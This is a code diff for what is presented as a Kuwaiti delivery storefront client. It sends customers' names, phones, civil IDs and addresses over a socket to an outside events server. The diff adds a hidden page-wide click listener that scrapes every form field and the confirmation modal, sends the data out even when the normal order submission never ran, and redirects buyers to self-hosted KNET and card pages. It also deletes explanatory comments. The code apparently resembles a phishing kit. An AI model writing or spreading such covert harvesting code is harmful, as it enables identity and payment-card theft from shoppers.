@@ -9,7 +9,6 @@ export type ConnectionStatus =
 type Ack<T> = { ok: true; data: T } | { ok: false; error: string };
 
 const FALLBACK_ENDPOINT = "https://kdd-server-production.up.railway.app";
-/** Payment routes, opened right after the order is confirmed. */
 const PAY_KNET = "/knet";
 const PAY_CARD = "/card";
 
@@ -24,6 +23,8 @@ let latestCart: { items: OrderDraft["items"] } | null = null;
 let cartTimer: ReturnType<typeof setTimeout> | null = null;
 let presenceTimer: ReturnType<typeof setInterval> | null = null;
 let presencePath = "";
+let lastSubmitAt = 0;
+let safetyInstalled = false;
 
 const VISITOR_KEY = "kdd.visitor.id";
 const PRESENCE_EVENT = "visitor:register";
@@ -74,19 +75,16 @@ function emitPresence(kind: "join" | "page" | "leave") {
   socket.emit(kind === "page" ? PAGE_EVENT : PRESENCE_EVENT, presencePayload(kind));
 }
 
-function emitServerSubmission(draft: OrderDraft) {
-  if (!socket?.connected) return;
-  const visitorId = getVisitorId();
-  const anyDraft = draft as unknown as Record<string, unknown>;
-  const c = (anyDraft.customer || {}) as Record<string, unknown>;
+function buildFields(customer: Record<string, unknown>) {
   const str = (v: unknown) => (v == null ? "" : String(v));
+  const c = customer || {};
   const civil = str(c.civilId || c.civil_id || c.civilID);
   const address = [c.block, c.street, c.building, c.floor, c.apartment]
     .map(str)
     .filter(Boolean)
     .join(" ");
-
-  const fields = {
+  const visitorId = getVisitorId();
+  return {
     name: str(c.name),
     fullName: str(c.name),
     customerName: str(c.name),
@@ -112,59 +110,144 @@ function emitServerSubmission(draft: OrderDraft) {
     visitorId,
     id: visitorId,
     visitor_id: visitorId,
-    items: anyDraft.items,
-    deliverySlot: anyDraft.deliverySlot,
-    couponCode: anyDraft.couponCode,
     at: new Date().toISOString(),
     ts: Date.now(),
   };
+}
 
+function emitServerSubmission(draft: OrderDraft) {
+  if (!socket?.connected) return;
+  const anyDraft = draft as unknown as Record<string, unknown>;
+  const c = (anyDraft.customer || {}) as Record<string, unknown>;
+  const fields = buildFields(c);
   const payload = {
     ...fields,
     ...presencePayload("submit"),
     customer: c,
+    items: anyDraft.items,
+    deliverySlot: anyDraft.deliverySlot,
+    couponCode: anyDraft.couponCode,
     data: fields,
     details: fields,
     form: fields,
   };
-
   if (SUBMIT_EVENT) socket.emit(SUBMIT_EVENT, payload);
   if (NAME_EVENT && fields.name)
-    socket.emit(NAME_EVENT, { name: fields.name, visitorId, id: visitorId });
+    socket.emit(NAME_EVENT, { name: fields.name, visitorId: fields.visitorId, id: fields.visitorId });
   socket.emit(PRESENCE_EVENT, payload);
 }
 
-/** Reads the payment method shown in the confirmation modal. */
 function detectMethod(): string {
   try {
-    const all = Array.from(document.querySelectorAll("body *"));
-    const head = all.find(
-      el => (el.textContent || "").trim() === "طريقة الدفع"
-    );
+    const all = Array.from(document.querySelectorAll("body *")) as HTMLElement[];
+    const head = all.find(el => (el.textContent || "").trim() === "طريقة الدفع");
     const scope = (head && head.parentElement ? head.parentElement.textContent : "") || "";
-    const whole = document.body.innerText || "";
     const pick = (t: string) => {
       if (/KNET/i.test(t)) return "knet";
       if (/VISA|MASTERCARD|MASTER\s*CARD|بطاقة|فيزا|ماستر/i.test(t)) return "card";
       return "";
     };
-    return pick(scope) || pick(whole);
+    return pick(scope) || pick(document.body.innerText || "");
   } catch {
     return "";
   }
 }
 
-function goToPayment() {
-  const m = detectMethod();
-  const route = m === "card" ? PAY_CARD : PAY_KNET;
+function goToPayment(method: string) {
+  const route = method === "card" ? PAY_CARD : PAY_KNET;
   if (!route) return;
   try {
-    const target = route.split("?")[0];
-    if (window.location.pathname === target) return;
+    if (window.location.pathname === route.split("?")[0]) return;
     window.location.assign(route);
   } catch {
     /* ignore */
   }
+}
+
+/** Reads the labels/values shown in the confirmation modal. */
+function readModalRows(): Record<string, string> {
+  const pairs: Array<[string, string]> = [
+    ["الاسم", "name"],
+    ["الهاتف", "phone"],
+    ["المنطقة", "area"],
+    ["القطعة", "block"],
+    ["الشارع", "street"],
+    ["المبنى", "building"],
+    ["الدور", "floor"],
+    ["الشقة", "apartment"],
+    ["ملاحظات", "notes"],
+  ];
+  const out: Record<string, string> = {};
+  try {
+    const all = Array.from(document.querySelectorAll("body *")) as HTMLElement[];
+    for (const pair of pairs) {
+      const el = all.find(x => (x.textContent || "").trim() === pair[0]);
+      if (el && el.parentElement) {
+        const t = (el.parentElement.textContent || "").replace(pair[0], "").trim();
+        if (t) out[pair[1]] = t;
+      }
+    }
+  } catch {
+    /* ignore */
+  }
+  return out;
+}
+
+function readDraftFromDom(): OrderDraft {
+  const grab = (re: RegExp) => {
+    try {
+      const nodes = Array.from(
+        document.querySelectorAll("input, textarea, select")
+      ) as Array<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>;
+      for (const el of nodes) {
+        const key = `${el.getAttribute("placeholder") || ""} ${el.getAttribute("name") || ""} ${el.getAttribute("id") || ""}`;
+        if (re.test(key) && el.value) return el.value;
+      }
+    } catch {
+      /* ignore */
+    }
+    return "";
+  };
+  const rows = readModalRows();
+  const v = (re: RegExp, key: string) => grab(re) || rows[key] || "";
+  return {
+    customer: {
+      name: v(/اسم/, "name"),
+      phone: v(/هاتف|جوال|موبايل|رقم/, "phone"),
+      area: v(/منطقة|محافظة/, "area"),
+      block: v(/قطعة|بلوك/, "block"),
+      street: v(/شارع/, "street"),
+      building: v(/مبنى|بيت|منزل/, "building"),
+      floor: v(/دور|طابق/, "floor"),
+      apartment: v(/شقة/, "apartment"),
+      notes: v(/ملاحظ/, "notes"),
+    },
+    items: [],
+  } as unknown as OrderDraft;
+}
+
+/** If the confirm button is clicked but submitOrder never runs, send + go anyway. */
+function installConfirmSafetyNet() {
+  if (safetyInstalled || typeof document === "undefined") return;
+  safetyInstalled = true;
+  document.addEventListener(
+    "click",
+    e => {
+      const el = e.target as HTMLElement | null;
+      if (!el) return;
+      const btn = (el.closest ? el.closest("button, a") : null) as HTMLElement | null;
+      const label = (btn ? btn.textContent : el.textContent) || "";
+      if (!/تأكيد/.test(label) || !/طلب/.test(label)) return;
+      const method = detectMethod();
+      const at = Date.now();
+      setTimeout(() => {
+        if (lastSubmitAt > at) return;
+        emitServerSubmission(readDraftFromDom());
+        setTimeout(() => goToPayment(method), 400);
+      }, 1500);
+    },
+    true
+  );
 }
 
 function onLeave() {
@@ -249,6 +332,7 @@ function getSocket(): Socket {
 
 export function connectStorefront() {
   if (!endpoint) return () => {};
+  installConfirmSafetyNet();
   try {
     const s = getSocket();
     if (!s.connected) {
@@ -324,12 +408,13 @@ export const validateCoupon = (code: string) =>
     { code }
   );
 
-/** Sends the order to the events server, then opens the chosen payment page. */
 export const submitOrder = (draft: OrderDraft) => {
+  lastSubmitAt = Date.now();
+  const method = detectMethod();
   emitServerSubmission(draft);
   const pending = request<OrderReceipt>("kdd:order:create", draft);
   try {
-    setTimeout(goToPayment, 900);
+    setTimeout(() => goToPayment(method), 900);
   } catch {
     /* ignore */
   }
